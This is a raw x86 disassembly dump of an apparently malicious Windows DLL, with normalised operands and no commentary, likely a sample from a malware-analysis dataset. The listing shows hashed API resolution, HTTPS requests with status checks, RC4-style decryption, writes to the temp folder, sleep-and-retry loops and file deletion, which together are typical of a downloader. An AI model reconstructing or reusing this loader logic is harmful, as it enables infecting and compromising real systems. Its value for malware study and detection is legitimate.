push 0x9f13856a
push 0x8
push 0x0
call sub_10001f77
add esp 0x10
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_10002717
push ebp
mov ebp esp
push 0x1d9
push 0x2f5ce027
push 0x8
push 0x0
call sub_10001f77
add esp 0x10
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_10002743
push ebp
mov ebp esp
push 0x36
push 0x58fe7abe
push 0x1
push 0x0
call sub_10001f77
add esp 0x10
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_10002763
push ebp
mov ebp esp
push 0x1e5
push 0x1a212962
push 0x8
push 0x0
call sub_10001f77
add esp 0x10
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_100027ac
push ebp
mov ebp esp
push 0x1d5
push 0x2ae71934
push 0x8
push 0x0
call sub_10001f77
add esp 0x10
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_100027d5
push ebp
mov ebp esp
push 0x1d7
push 0x1ad09c78
push 0x8
push 0x0
call sub_10001f77
add esp 0x10
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_100027fe
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_100026a0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000229f
pop ecx
sub_1000281d
push ebp
mov ebp esp
push ecx
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1f
push [ ebp + 0x8 ]
mov [ ebp - 0x8 ] 0x4
call sub_100027ac
or [ ebp - 0x4 ] 0x3180
push 0x4
lea eax [ ebp - 0x4 ]
push eax
push 0x1f
push [ ebp + 0x8 ]
call sub_100027d5
add esp 0x20
leave
retn
sub_10002857
push ebp
mov ebp esp
sub esp 0x24
push ebx
push esi
xor ebx ebx
push edi
mov [ ebp - 0x14 ] ebx
push 0x1d0
push 0x1510002f
push 0x8
push ebx
call sub_10001f77
add esp 0x10
push ebx
push 0x800000
push ebx
push ebx
push ebx
push rw-data
push rw-data
push [ ebp - 0x8 ]
call eax
mov edi eax
push edi
mov [ ebp - 0x1c ] edi
call sub_1000281d
mov esi rw-data
push esi
call sub_10002ea0
push eax
push esi
push ebx
push ebx
push edi
call sub_100026eb
add esp 0x1c
test eax eax
je r-xdata
mov edi rw-data
push edi
call sub_10002ea0
pop ecx
test eax eax
je r-xdata
push [ ebp - 0x1c ]
call sub_1000278c
push [ ebp - 0x8 ]
call sub_1000278c
push [ ebp - 0x20 ]
call sub_1000278c
add esp 0xc
cmp [ ebp - 0x10 ] ebx
ja r-xdata
push ebx
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x20000005
push edi
mov [ ebp - 0x24 ] 0x4
mov [ ebp - 0x4 ] ebx
call sub_10002717
add esp 0x14
mov esi eax
cmp [ rw-data ] bl
je r-xdata
push esi
call sub_10002ea0
push eax
push esi
push 0x2b
push [ ebp - 0x8 ]
call sub_100027d5
push edi
call sub_10002ea0
push eax
push edi
push 0x2c
push [ ebp - 0x8 ]
call sub_100027d5
add esp 0x28
pop edi
pop esi
xor eax eax
pop ebx
leave
retn 0x4
push 0x2710
call sub_10001bff
inc [ ebp - 0x14 ]
cmp [ ebp - 0x14 ] 0x1e
jb r-xdata
push r--data
push rw-data
push rw-data
call sub_100030f9
add esp 0xc
mov [ ebp - 0x18 ] eax
cmp esi ebx
je r-xdata
push rw-data
push 0x104
call sub_10002743
pop ecx
pop ecx
push ebx
push ebx
push rw-data
push [ rw-data ]
mov [ ebp - 0x10 ] ebx
push rw-data
call sub_100026bf
push 0x1ce
push 0xbe618d3e
push 0x8
push ebx
mov [ ebp - 0x20 ] eax
call sub_10001f77
add esp 0x24
push ebx
push ebx
push 0x3
push ebx
push ebx
push 0x1bb
push rw-data
push [ ebp - 0x20 ]
call eax
mov esi rw-data
push esi
mov [ ebp - 0x8 ] eax
call sub_10002ea0
pop ecx
test eax eax
je r-xdata
push 0x1
push r--data
push eax
call sub_100034fa
add esp 0xc
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x4 ] 0x24
jbe r-xdata
push [ ebp - 0x4 ]
call sub_100021c0
pop ecx
mov edi eax
xor esi esi
mov [ ebp - 0xc ] ebx
cmp esi [ ebp - 0x4 ]
jne r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
push edi
call sub_100021d8
pop ecx
jmp r-xdata
push [ ebp - 0x4 ]
push edi
push [ ebp - 0x18 ]
call sub_100034fa
add esp 0xc
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x4 ]
lea eax [ esi + edi ]
push eax
push [ ebp - 0x1c ]
call sub_10002763
add esi [ ebp - 0xc ]
add esp 0x10
cmp [ ebp - 0xc ] ebx
je r-xdata
push [ ebp - 0x18 ]
call sub_100021d8
pop ecx
sub_10002a5d
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
xor ebx ebx
push edi
mov [ ebp - 0x14 ] ebx
mov esi rw-data
push 0x1d0
push 0x1510002f
push 0x8
push ebx
call sub_10001f77
add esp 0x10
push ebx
push 0x800000
push ebx
push ebx
push ebx
push rw-data
push rw-data
push [ ebp - 0x4 ]
call eax
push eax
mov [ ebp - 0xc ] eax
call sub_1000281d
mov edi rw-data
push edi
call sub_10002ea0
push eax
push edi
push ebx
push ebx
push [ ebp - 0xc ]
call sub_100026eb
add esp 0x1c
test eax eax
je r-xdata
mov edi rw-data
push edi
call sub_10002ea0
pop ecx
test eax eax
je r-xdata
push [ ebp - 0xc ]
call sub_1000278c
push [ ebp - 0x4 ]
call sub_1000278c
push [ ebp - 0x18 ]
call sub_1000278c
add esp 0xc
cmp [ ebp - 0x10 ] ebx
ja r-xdata
push ebx
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x20000013
push [ ebp - 0xc ]
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1c ] 0x4
call sub_10002717
add esp 0x14
cmp [ ebp - 0x8 ] 0xc8
je r-xdata
push esi
call sub_10002ea0
push eax
push esi
push 0x2b
push [ ebp - 0x4 ]
call sub_100027d5
push edi
call sub_10002ea0
push eax
push edi
push 0x2c
push [ ebp - 0x4 ]
call sub_100027d5
add esp 0x28
pop edi
pop esi
xor eax eax
pop ebx
leave
retn 0x4
inc [ ebp - 0x14 ]
cmp [ ebp - 0x14 ] 0x1e
jb r-xdata
mov [ ebp - 0x10 ] 0x1
cmp [ ebp - 0x8 ] 0x194
mov [ ebp - 0x10 ] ebx
jne r-xdata
push ebx
push ebx
push rw-data
push [ rw-data ]
mov [ ebp - 0x10 ] ebx
push rw-data
call sub_100026bf
push 0x1ce
push 0xbe618d3e
push 0x8
push ebx
mov [ ebp - 0x18 ] eax
call sub_10001f77
add esp 0x24
push ebx
push ebx
push 0x3
push ebx
push ebx
push 0x1bb
push rw-data
push [ ebp - 0x18 ]
call eax
push esi
mov [ ebp - 0x4 ] eax
call sub_10002ea0
pop ecx
test eax eax
je r-xdata
push r--data
push rw-data
push rw-data
call sub_100030f9
add esp 0xc
mov edi eax
push 0x1
cmp [ ebp - 0x10 ] ebx
je r-xdata
push rw-data
push 0x104
call sub_10002743
pop ecx
pop ecx
cmp [ rw-data ] bl
je r-xdata
push r--data
push r--data
jmp r-xdata
push edi
call sub_100034fa
add esp 0xc
push edi
mov [ ebp - 0x10 ] eax
call sub_100021d8
pop ecx
sub_10002c21
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1000316e
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000229f
pop ecx
sub_10002c40
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi 0x104
push esi
call sub_100021c0
pop ecx
mov edi eax
push edi
push esi
call [ GetTempPathA@IAT ]
push 0xc
call sub_10002296
xor ebx ebx
pop ecx
cmp eax ebx
je r-xdata
xor esi esi
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax ] r--data
mov esi eax
jmp r-xdata
mov esi r--data
push esi
push [ ebp + 0xc ]
push edi
call sub_100030f9
push esi
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push r--data
push edi
call sub_100030f9
add esp 0x1c
mov esi eax
cmp [ ebp + 0x10 ] bl
je r-xdata
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax ]
push 0x1
push esi
push 0xa7
push r--data
push edi
call sub_10003ab2
push esi
call sub_10003851
add esp 0x18
cmp esi ebx
je r-xdata
push [ ebp - 0x4 ]
call sub_100021d8
push esi
call sub_100021d8
push edi
call sub_100021d8
add esp 0xc
pop edi
pop esi
mov eax ebx
pop ebx
leave
retn
mov [ ebp + 0x10 ] ebx
push [ ebp + 0x8 ]
push esi
call sub_10003559
pop ecx
pop ecx
push esi
push [ ebp - 0x4 ]
call sub_100034b2
pop ecx
test al al
jne r-xdata
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call sub_10003559
pop ecx
pop ecx
push [ ebp - 0x4 ]
jmp r-xdata
push 0x2710
call [ Sleep@IAT ]
inc [ ebp + 0x10 ]
cmp [ ebp + 0x10 ] 0x1e
jb r-xdata
mov ebx eax
call [ DeleteFileA@IAT ]
push esi
call sub_100034b2
pop ecx
test al al
jne r-xdata
jmp r-xdata
sub_10002d45
push ebp
mov ebp esp
push ecx
push esi
push edi
push 0x7a
push 0x61
push 0x5
mov [ ebp - 0x4 ] 0x0
call sub_100036ec
push r--data
mov esi eax
push r--data
push esi
call sub_100030f9
push esi
mov edi eax
call sub_100021d8
push [ ebp + 0x34 ]
push edi
push [ ebp + 0x30 ]
push [ ebp + 0x2c ]
push [ ebp + 0x28 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100022c8
add esp 0x50
test al al
je r-xdata
push [ ebp - 0x4 ]
push edi
push [ ebp + 0x38 ]
call sub_10002c40
push edi
mov esi eax
call sub_100021d8
add esp 0x10
pop edi
mov eax esi
pop esi
leave
retn
push 0x0
push sub_10002857
call sub_10002183
pop ecx
pop ecx
mov [ ebp - 0x4 ] al
sub_10002dd3
push ebp
mov ebp esp
push ecx
push esi
push edi
push 0x7a
push 0x61
push 0x5
mov [ ebp - 0x4 ] 0x0
call sub_100036ec
push r--data
mov esi eax
push r--data
push esi
call sub_100030f9
push esi
mov edi eax
call sub_100021d8
push [ ebp + 0x34 ]
push edi
push [ ebp + 0x30 ]
push [ ebp + 0x2c ]
push [ ebp + 0x28 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100024b4
add esp 0x50
test al al
je r-xdata
push [ ebp - 0x4 ]
push edi
push [ ebp + 0x38 ]
call sub_10002c40
push edi
mov esi eax
call sub_100021d8
add esp 0x10
pop edi
mov eax esi
pop esi
leave
retn
push 0x0
push sub_10002a5d
call sub_10002183
pop ecx
pop ecx
mov [ ebp - 0x4 ] al
sub_10002e61
push esi
push edi
mov esi ecx
xor edi edi
cmp [ esi + 0x8 ] edi
jbe r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
lea eax [ eax + edi * 4 ]
cmp [ eax ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
and [ esi + 0x8 ] 0x0
pop edi
mov al 0x1
pop esi
retn
push eax
call sub_100021d8
pop ecx
inc edi
cmp edi [ esi + 0x8 ]
jb r-xdata
push [ eax ]
call sub_100021d8
pop ecx
sub_10002ea0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
jne r-xdata
cmp [ ecx ] 0x0
mov eax ecx
je r-xdata
xor eax eax
pop ebp
retn
sub eax ecx
pop ebp
retn
inc eax
cmp [ eax ] 0x0
jne r-xdata
sub_10002ebf
push ebp
mov ebp esp
sub esp 0x10c
push ebx
push esi
push edi
xor ebx ebx
push 0xff
lea eax [ ebp - 0x10b ]
push ebx
push eax
mov [ ebp - 0x10c ] bl
call sub_10004208
push 0x34
mov [ ebp - 0x1 ] bl
call sub_100021c0
push 0x32
push [ ebp + 0x10 ]
mov esi eax
push esi
call sub_10002249
mov eax [ ebp + 0xc ]
add esp 0x1c
add eax [ ebp + 0x8 ]
mov cl [ eax - 0x2 ]
mov [ esi + 0x32 ] cl
mov al [ eax - 0x1 ]
mov [ esi + 0x33 ] al
movzx eax [ ebp - 0x1 ]
mov cl [ ebp - 0x1 ]
inc [ ebp - 0x1 ]
mov [ ebp + eax - 0x10c ] cl
jne r-xdata
xor edi edi
inc [ ebp - 0x1 ]
movzx edi al
lea eax [ ebp + edi - 0x10c ]
mov bl [ eax ]
mov [ ecx ] bl
mov [ eax ] dl
jne r-xdata
dec eax
or eax 0xffffff00
inc eax
movzx eax [ ebp - 0x1 ]
lea ecx [ ebp + eax - 0x10c ]
cdq
push 0x34
pop ebx
idiv ebx
movzx eax [ edx + esi ]
mov dl [ ecx ]
movzx ebx dl
add eax edi
add eax ebx
and eax 0x800000ff
jns r-xdata
push esi
call sub_100021d8
cmp [ ebp + 0x14 ] 0x0
mov esi [ ebp + 0xc ]
pop ecx
je r-xdata
lea eax [ esi - 0x1 ]
push eax
push esi
jmp r-xdata
movzx edx cl
lea esi [ ebp + edx - 0x10c ]
movzx ecx [ esi ]
add ecx edi
and ecx 0x800000ff
jns r-xdata
dec ecx
or ecx 0xffffff00
inc ecx
call sub_100021c0
pop ecx
mov ecx [ ebp + 0x8 ]
sub ecx eax
xor edx edx
xor edi edi
add esi 0xfffffffe
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] ecx
mov [ ebp + 0x8 ] esi
movzx edi cl
lea ecx [ ebp + edi - 0x10c ]
mov bl [ ecx ]
mov [ ebp + 0x17 ] bl
mov bl [ esi ]
mov [ ecx ] bl
mov bl [ ebp + 0x17 ]
mov [ esi ] bl
movzx ecx [ ecx ]
movzx esi bl
add esi ecx
and esi 0x800000ff
jns r-xdata
dec ecx
or ecx 0xffffff00
inc ecx
mov cl [ ebp + esi - 0x10c ]
mov esi [ ebp - 0xc ]
xor cl [ esi + eax ]
mov [ eax ] cl
inc eax
dec [ ebp + 0x8 ]
jne r-xdata
dec esi
or esi 0xffffff00
inc esi
lea ecx [ edx + 0x1 ]
and ecx 0x800000ff
jns r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
pop edi
pop esi
mov [ eax + ecx - 0x2 ] 0x0
pop ebx
leave
retn
sub_10003020
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
xor eax eax
test edx edx
je r-xdata
pop ebp
retn
jmp r-xdata
mov cl [ edx ]
test cl cl
jne r-xdata
imul eax eax 0xa
movsx ecx cl
lea eax [ eax + ecx - 0x30 ]
inc edx
sub_10003041
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl [ ebp + 0xc ]
je r-xdata
pop ebp
retn
inc eax
sub_1000305d
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
test edx edx
je r-xdata
xor al al
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
push edi
push edx
call sub_10002ea0
push esi
mov edi eax
call sub_10002ea0
pop ecx
pop ecx
cmp edi eax
pop edi
jne r-xdata
mov cl [ edx ]
test cl cl
je r-xdata
mov al 0x1
jmp r-xdata
mov eax edx
sub esi edx
pop esi
pop ebp
retn
inc eax
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl [ esi + eax ]
jne r-xdata
sub_100030a4
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
call sub_10002ea0
inc eax
push eax
call sub_100021c0
push [ ebp + 0x8 ]
mov esi eax
call sub_10002ea0
push eax
push [ ebp + 0x8 ]
push esi
call sub_10002249
add esp 0x18
mov eax esi
pop esi
pop ebp
retn
sub_100030d3
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
lea eax [ esi + 0x1 ]
push edi
push eax
call sub_100021c0
push esi
push [ ebp + 0x8 ]
mov edi eax
push edi
call sub_10002249
add esp 0x10
mov eax edi
pop edi
pop esi
pop ebp
retn
sub_100030f9
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_10002ea0
pop ecx
test eax eax
je r-xdata
pop esi
leave
retn
push ebx
push edi
xor ebx ebx
mov [ ebp - 0x4 ] 0x1
lea edi [ ebp + 0x8 ]
add edi 0x4
mov esi [ edi ]
push r--data
push esi
call sub_1000305d
pop ecx
pop ecx
test al al
je r-xdata
push esi
call sub_10002ea0
add eax [ ebp - 0x4 ]
push eax
push ebx
call sub_100021f7
push esi
mov ebx eax
call sub_10002ea0
push eax
mov eax [ ebp - 0x4 ]
lea eax [ eax + ebx - 0x1 ]
push esi
push eax
call sub_10002249
push esi
call sub_10002ea0
add esp 0x20
add [ ebp - 0x4 ] eax
test esi esi
je r-xdata
pop edi
mov eax ebx
pop ebx
sub_10003184
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
test edi edi
je r-xdata
xor al al
push edi
call sub_10002ea0
pop ecx
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
push 0x4
call sub_100021c0
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
retn 0x4
lea eax [ eax * 4 + 0x4 ]
push eax
push ecx
call sub_100021f7
pop ecx
jmp r-xdata
pop ecx
push edi
mov [ esi + 0x4 ] eax
call sub_10002ea0
inc eax
push eax
call sub_100021c0
push edi
mov [ ebp + 0x8 ] eax
call sub_10002ea0
push eax
push edi
push [ ebp + 0x8 ]
call sub_100041e0
mov ecx [ esi + 0x4 ]
push 0x4
lea eax [ ebp + 0x8 ]
push eax
mov eax [ esi + 0x8 ]
lea eax [ ecx + eax * 4 ]
push eax
call sub_100041e0
add esp 0x24
inc [ esi + 0x8 ]
mov al 0x1
jmp r-xdata
sub_1000320e
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
test edx edx
jne r-xdata
movzx ecx [ edx ]
push edi
xor eax eax
xor edi edi
test cx cx
je r-xdata
or eax 0xffffffff
pop ebp
retn
pop edi
pop ebp
retn
push ebx
push esi
cmp [ ebp + 0x10 ] 0x0
movzx ecx cx
je r-xdata
cmp edi [ ebp + 0xc ]
jae r-xdata
movzx ecx cx
rol eax 0x7
add edx 0x2
xor eax ecx
movzx ecx [ edx ]
inc edi
test cx cx
jne r-xdata
lea ebx [ ecx - 0x41 ]
mov esi ecx
cmp bx 0x19
ja r-xdata
pop esi
pop ebx
cmp [ ebp + 0xc ] 0x0
je r-xdata
movzx ecx si
add ecx 0x20
movzx esi cx
sub_1000326d
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
test edx edx
jne r-xdata
push esi
push edi
xor esi esi
xor edi edi
jmp r-xdata
or eax 0xffffffff
pop ebp
retn
mov cl [ edx ]
test cl cl
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp edi [ ebp + 0xc ]
jae r-xdata
movsx eax cl
rol esi 0x7
xor esi eax
inc edx
inc edi
lea eax [ ecx - 0x41 ]
cmp al 0x19
ja r-xdata
add cl 0x20
sub_100032b5
push ebx
push esi
push edi
mov esi ecx
xor ebx ebx
xor edi edi
cmp [ esi + 0x8 ] ebx
jbe r-xdata
mov eax [ esi + 0x4 ]
cmp eax ebx
je r-xdata
mov eax [ esi + 0x4 ]
mov eax [ eax + edi * 4 ]
cmp [ eax ] ebx
je r-xdata
pop edi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
pop esi
mov al 0x1
pop ebx
retn
push eax
call sub_100021d8
pop ecx
mov eax [ esi + 0x4 ]
lea eax [ eax + edi * 4 ]
cmp [ eax ] ebx
je r-xdata
push [ eax ]
call sub_100021d8
pop ecx
inc edi
cmp edi [ esi + 0x8 ]
jb r-xdata
push [ eax ]
call sub_100021d8
pop ecx
sub_10003307
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
xor ebx ebx
xor eax eax
mov [ ebp - 0x10 ] bl
lea edi [ ebp - 0xf ]
stosd [ edi ]
stosb [ edi ]
mov [ ebp - 0x18 ] bl
xor eax eax
lea edi [ ebp - 0x17 ]
stosd [ edi ]
push ebx
stosb [ edi ]
mov esi r--data
push esi
mov edi r--data
push edi
call sub_10002ea0
pop ecx
push eax
push edi
call sub_10002ebf
add esp 0x10
push ebx
push esi
mov edi r--data
push edi
mov [ ebp - 0x8 ] eax
call sub_10002ea0
pop ecx
push eax
push edi
call sub_10002ebf
mov edi eax
push 0x6
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
call sub_10001c60
push 0x6
lea eax [ ebp - 0x18 ]
push eax
push edi
call sub_10001c60
push [ ebp - 0x8 ]
call sub_100021d8
push edi
call sub_100021d8
add esp 0x30
push ebx
push esi
mov edi r--data
push edi
mov [ ebp - 0x1 ] bl
call sub_10002ea0
pop ecx
push eax
push edi
call sub_10002ebf
add esp 0x10
push ebx
push esi
mov edi r--data
push edi
mov [ ebp - 0x8 ] eax
call sub_10002ea0
pop ecx
push eax
push edi
call sub_10002ebf
add esp 0x10
push ebx
push esi
mov esi r--data
push esi
mov edi eax
call sub_10002ea0
pop ecx
push eax
push esi
call sub_10002ebf
push [ ebp - 0x8 ]
mov esi eax
lea eax [ ebp - 0x10 ]
push eax
call sub_1000305d
add esp 0x18
test al al
jne r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_1000305d
pop ecx
pop ecx
test al al
je r-xdata
push [ ebp - 0x8 ]
call sub_100021d8
push edi
call sub_100021d8
push esi
call sub_100021d8
mov al [ ebp - 0x1 ]
add esp 0xc
pop edi
pop esi
pop ebx
leave
retn
push [ ebp - 0x8 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_1000305d
pop ecx
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_1000305d
pop ecx
pop ecx
test al al
je r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x18 ]
push edi
push eax
call sub_1000305d
pop ecx
pop ecx
test al al
je r-xdata
sub_10003453
push ebp
mov ebp esp
push esi
push edi
mov esi 0x8000
xor eax eax
push 0x0
push esi
push edi
push [ ebp + 0x8 ]
call sub_10001eb9
add esp 0x10
cmp eax 0xc0000004
jne r-xdata
test eax eax
jne r-xdata
push edi
call sub_100021d8
pop ecx
add esi esi
jmp r-xdata
push edi
call sub_100021d8
pop ecx
mov eax edi
jmp r-xdata
push esi
call sub_100021c0
mov edi eax
pop ecx
test edi edi
je r-xdata
pop edi
pop esi
pop ebp
retn
sub_100034b2
push ebp
mov ebp esp
sub esp 0x140
and [ ebp - 0x140 ] 0x0
push 0x13c
lea eax [ ebp - 0x13c ]
push 0x0
push eax
call sub_10004208
add esp 0xc
lea eax [ ebp - 0x140 ]
push eax
push [ ebp + 0x8 ]
call sub_10001cb2
cmp eax 0xffffffff
je r-xdata
xor al al
leave
retn
push eax
call sub_10001ce4
mov al 0x1
leave
retn
sub_100034fa
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ ebp + 0x8 ] esi
jne r-xdata
push edi
push esi
push 0x80
push 0x2
push esi
push 0x1
push 0x40000000
push [ ebp + 0x8 ]
call sub_10001ae6
mov edi eax
cmp edi 0xffffffff
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x8 ] esi
cmp [ ebp + 0xc ] esi
je r-xdata
xor eax eax
jmp r-xdata
pop esi
pop ebp
retn
push edi
call sub_10001acc
mov eax [ ebp + 0x8 ]
pop ecx
cmp [ ebp + 0x10 ] esi
je r-xdata
pop edi
push esi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_10001afc
sub_10003559
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push edi
xor edi edi
mov [ ebx ] edi
cmp [ ebp + 0x8 ] edi
jne r-xdata
push edi
push edi
push 0x3
push edi
push edi
push 0x80000000
push [ ebp + 0x8 ]
call sub_10001ae6
mov [ ebp + 0x8 ] eax
cmp eax 0xffffffff
je r-xdata
xor eax eax
jmp r-xdata
push esi
push edi
push eax
call sub_10001b6a
mov esi eax
lea eax [ esi + 0x1 ]
push eax
call sub_100021c0
pop ecx
mov [ ebp + 0xc ] eax
cmp eax edi
je r-xdata
pop edi
pop ebx
pop ebp
retn
push [ ebp + 0x8 ]
call sub_10001acc
cmp esi [ ebx ]
pop ecx
pop esi
je r-xdata
cmp esi edi
je r-xdata
mov eax [ ebp + 0xc ]
mov [ ebx ] edi
jmp r-xdata
push edi
push ebx
push esi
push eax
push [ ebp + 0x8 ]
call sub_10001b3e
sub_100035cd
push esi
push edi
xor edi edi
mov esi rw-data
call sub_10001ca0
push edi
mov [ esi ] eax
call sub_10001bff
add esi 0x4
add edi 0x3
cmp esi rw-data
jl r-xdata
pop edi
pop esi
retn
sub_100035f4
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push ebx
push esi
push edi
lea esi [ eax * 4 + rw-data ]
mov ecx [ esi ]
lea edx [ eax - 0x3 ]
and edx 0xf
mov edi [ edx * 4 + rw-data ]
lea edx [ ecx + ecx ]
xor edx edi
shl edx 0xf
xor edx edi
xor edx ecx
lea ecx [ eax - 0x7 ]
and ecx 0xf
mov ecx [ ecx * 4 + rw-data ]
mov edi ecx
shr edi 0xb
xor ecx edi
mov edi edx
xor edi ecx
mov [ esi ] edi
mov esi edi
and esi 0xfed22169
shl esi 0x5
xor esi edi
shl ecx 0xa
dec eax
and eax 0xf
lea edi [ eax * 4 + rw-data ]
mov ebx [ edi ]
xor ecx edx
shl ecx 0x10
xor ecx ebx
shl ecx 0x2
xor ecx esi
mov [ rw-data ] eax
xor ecx edx
mov eax ecx
xor eax ebx
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
call sub_100035cd
sub_10003680
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
cmp edi esi
jne r-xdata
jbe r-xdata
mov eax esi
jmp r-xdata
call sub_100035f4
sub esi edi
xor edx edx
div esi
lea eax [ edi + edx ]
call sub_100035f4
sub edi esi
xor edx edx
div edi
lea eax [ esi + edx ]
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_100036b7
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
push esi
movsx esi [ ebp + 0x14 ]
push edi
movsx edi [ ebp + 0x10 ]
mov [ ebp + 0x8 ] eax
push esi
push edi
call sub_10003680
mov [ ebx ] al
pop ecx
inc ebx
dec [ ebp + 0x8 ]
pop ecx
jne r-xdata
pop edi
pop esi
sub_100036ec
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
lea eax [ esi + 0x1 ]
push edi
push eax
call sub_100021c0
push [ ebp + 0x10 ]
mov edi eax
push [ ebp + 0xc ]
push esi
push edi
call sub_100036b7
add esp 0x14
mov eax edi
pop edi
pop esi
pop ebp
retn
sub_1000372e
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
push 0x4
call sub_100021c0
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
lea eax [ eax * 4 + 0x4 ]
push eax
push ecx
call sub_100021f7
pop ecx
jmp r-xdata
mov [ esi + 0x4 ] eax
pop ecx
mov ecx [ esi + 0x4 ]
push 0x4
lea eax [ ebp + 0x8 ]
push eax
mov eax [ esi + 0x8 ]
lea eax [ ecx + eax * 4 ]
push eax
call sub_10002249
add esp 0xc
inc [ esi + 0x8 ]
mov al 0x1
pop esi
pop ebp
retn 0x4
sub_10003780
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
call sub_10003307
test al al
je r-xdata
xor al al
leave
retn
push ebx
push esi
push edi
push 0x1
call sub_10001000
push 0xc
mov esi eax
call sub_10001188
push esi
mov edi eax
call sub_100018e7
push edi
push eax
call sub_10001fa9
push esi
mov ebx eax
call sub_100021d8
push edi
call sub_100021d8
xor esi esi
add esp 0x1c
cmp ebx esi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] esi
call ebx
test al al
jne r-xdata
xor al al
jmp r-xdata
xor eax eax
cmp [ ebp - 0x4 ] esi
sete al
mov [ ebp - 0x4 ] esi
pop edi
pop esi
pop ebx
